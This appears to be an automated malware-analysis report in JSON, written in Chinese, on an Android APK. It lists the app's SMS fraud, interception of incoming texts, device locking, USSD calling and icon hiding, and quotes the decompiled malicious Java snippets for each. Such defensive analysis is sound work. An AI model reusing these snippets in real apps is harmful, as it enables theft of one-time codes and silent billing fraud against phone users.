@@ -1,0 +1,194 @@
+{
+  "APK信息": {
+    "文件名": "417fc112cd0610cc8c402742b0baab0a086b5c4164230009e11d34fdeee7d3fa.apk",
+    "sha256": "417fc112cd0610cc8c402742b0baab0a086b5c4164230009e11d34fdeee7d3fa",
+    "包名": "com.rumba",
+    "应用名": "Youla",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 303.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\deapool\\checktls\\CmndTls;",
+          "method_signature": "switch(getResultCode()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager sms = SmsManager.getDefault();\nsms.sendTextMessage(phoneNo, null, msg, sentPI, deliveredPI);",
+          "malicious_code_snippet_context": "                      }\n                  }\n              }, new IntentFilter(\"SMS_DELIVERED\"));\n>>>             SmsManager sms = SmsManager.getDefault();\n>>>             sms.sendTextMessage(phoneNo, null, msg, sentPI, deliveredPI);\n          } catch (Exception ex) {\n              Toast.makeText(mContext, ex.getMessage().toString(), 1).show();\n              ex.printStackTrace();",
+          "behavior_description": "代码通过 SmsManager.getDefault() 获取短信管理器实例，并调用 sendTextMessage() 静默发送短信至指定号码 phoneNo，内容为 msg。同时注册了 SMS_DELIVERED 广播监听发送状态，整个过程无用户感知。在已确认的恶意样本中，此行为通常用于短信欺诈（如向高级短号发送订阅短信）或向C2服务器外发设备信息，直接造成用户经济损失或隐私泄露。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\deapool\\mess\\service\\receiver\\SmsReceiver;",
+          "method_signature": "for(Object aPdusObj : pdusObj)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Object[] pdusObj = (Object[]) bundle.get(\"pdus\");\nfor (Object aPdusObj : pdusObj) {\n    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);\n    String senderNum = currentMessage.getDisplayOriginatingAddress();\n    String message = currentMessage.getDisplayMessageBody();\n    sendReceivedSmsRequest(context, senderNum, message, 0L);\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "      }\n  \n      private void smsReceived(Context context, Bundle bundle) throws Exception {\n>>>         Object[] pdusObj = (Object[]) bundle.get(\"pdus\");\n>>>         if (pdusObj != null) {\n>>>             for (Object aPdusObj : pdusObj) {\n>>>                 SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);\n>>>                 String senderNum = currentMessage.getDisplayOriginatingAddress();\n>>>                 String message = currentMessage.getDisplayMessageBody();\n>>>                 sendReceivedSmsRequest(context, senderNum, message, 0L);\n>>>                 abortBroadcast();\n              }\n          }\n      }",
+          "behavior_description": "代码在短信广播接收器中拦截 incoming SMS，从 PDU 中提取发送方号码和短信正文，通过 sendReceivedSmsRequest() 将拦截的短信内容上传至远程服务器，随后调用 abortBroadcast() 终止广播继续传递，使用户无法在收件箱中看到该短信。这是典型的短信拦截窃取行为，常用于窃取银行验证码/OTP，直接造成用户隐私泄露和潜在经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\deapool\\checkui\\AdRequestDialog;",
+          "method_signature": "if(!dpm.isAdminActive(admName)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(\"device_policy\");\nComponentName admName = new ComponentName(this, (Class<?>) AdReceiver.class);\nif (!dpm.isAdminActive(admName)) {\n    IntTls.startoAdminAction(admName, this);\n} else {\n    dpm.lockNow();\n}",
+          "malicious_code_snippet_context": "  \n      private void setAdmin() {\n          try {\n>>>             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(\"device_policy\");\n>>>             if (dpm != null) {\n>>>                 ComponentName admName = new ComponentName(this, (Class<?>) AdReceiver.class);\n>>>                 if (!dpm.isAdminActive(admName)) {\n>>>                     IntTls.startoAdminAction(admName, this);\n>>>                 } else {\n>>>                     dpm.lockNow();\n                  }\n              }\n          } catch (Exception e) {",
+          "behavior_description": "代码检查应用是否拥有设备管理员权限，如果没有则请求激活设备管理员，如果已激活则直接调用 lockNow() 锁定屏幕，属于勒索软件典型的锁屏行为。数据流向：权限状态检查→设备锁屏操作。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\deapool\\checktls\\IntTls;",
+          "method_signature": "if(number.contains(\"#\")",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void callNumber(Context context, String number) {\n    if (number.contains(\"#\")) {\n        number = number.replaceAll(\"#\", Uri.encode(\"#\"));\n    }\n    Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + number));\n    intent.setFlags(268435456);\n    context.startActivity(intent);\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static void callNumber(Context context, String number) {\n>>>         try {\n>>>             if (number.contains(\"#\")) {\n>>>                 number = number.replaceAll(\"#\", Uri.encode(\"#\"));\n>>>             }\n>>>             String ussdCode = number;\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + ussdCode));\n>>>             intent.setFlags(268435456);\n              context.startActivity(intent);\n          } catch (Exception e) {\n              Print.e(e.toString());",
+          "behavior_description": "该方法接收外部传入的电话号码字符串，对其中包含的#号进行URI编码后，通过ACTION_CALL Intent直接发起电话呼叫（而非ACTION_DIAL仅调起拨号界面）。#号处理暗示支持USSD代码执行，可被用于静默拨打付费号码或执行USSD指令（如订阅付费服务、转账等），在恶意样本上下文中构成对用户造成直接经济损失的高风险行为。数据流向：外部传入number参数(source)→ACTION_CALL Intent发起静默呼叫(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\deapool\\MainActivity;",
+          "method_signature": "hideApp()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "ComponentName componentToDisable = new ComponentName(packageName, packageName + \".MainActivity\"); getApplicationContext().getPackageManager().setComponentEnabledSetting(componentToDisable, 2, 1);",
+          "malicious_code_snippet_context": "  \n      private void hideApp() {\n          String packageName = getPackageName();\n>>>         ComponentName componentToDisable = new ComponentName(packageName, packageName + \".MainActivity\");\n          getApplicationContext().getPackageManager().setComponentEnabledSetting(componentToDisable, 2, 1);\n      }\n  }",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将自身 MainActivity 组件设置为禁用状态（COMPONENT_ENABLED_STATE_DISABLED=2），使应用图标从启动器中消失，用户无法在桌面上看到该应用。这是恶意软件常用的隐蔽手段，在安装后隐藏自身存在以避免被用户发现和卸载，为后续恶意行为（如后台窃取隐私、发送短信等）提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
